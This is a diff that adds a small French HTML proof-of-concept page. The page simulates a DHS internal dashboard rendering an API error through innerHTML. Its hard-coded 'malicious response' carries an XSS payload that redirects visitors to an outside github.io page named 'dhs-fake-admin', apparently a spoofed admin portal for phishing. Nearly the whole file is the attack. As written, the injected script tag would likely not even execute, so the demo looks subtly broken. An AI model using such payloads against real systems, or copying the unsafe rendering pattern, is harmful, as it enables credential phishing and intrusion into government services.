@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>DHS - PoC de Rendu Vulnérable</title>
+    <style>
+        body { font-family: sans-serif; padding: 2em; }
+        #error-box { border: 2px solid red; padding: 1em; background: #ffeeee; }
+    </style>
+</head>
+<body>
+    <h1>Démonstration : Rendu d'une erreur API non sécurisée</h1>
+    <p>Cette page simule comment un dashboard interne du DHS pourrait afficher une erreur, menant à un XSS.</p>
+    <div id="error-box"></div>
+
+    <script>
+        // On simule la réponse de l'API qui contient votre payload
+        const reponseApiMalveillante = "Message d'erreur ''><script>window.location='https://6r1n6o13-code.github.io/dhs-fake-admin/'</script>' non valide";
+
+        // Injection DANGEREUSE (c'est ce que vous voulez démontrer)
+        document.getElementById("error-box").innerHTML = reponseApiMalveillante;
+    </script>
+</body>
+</html>
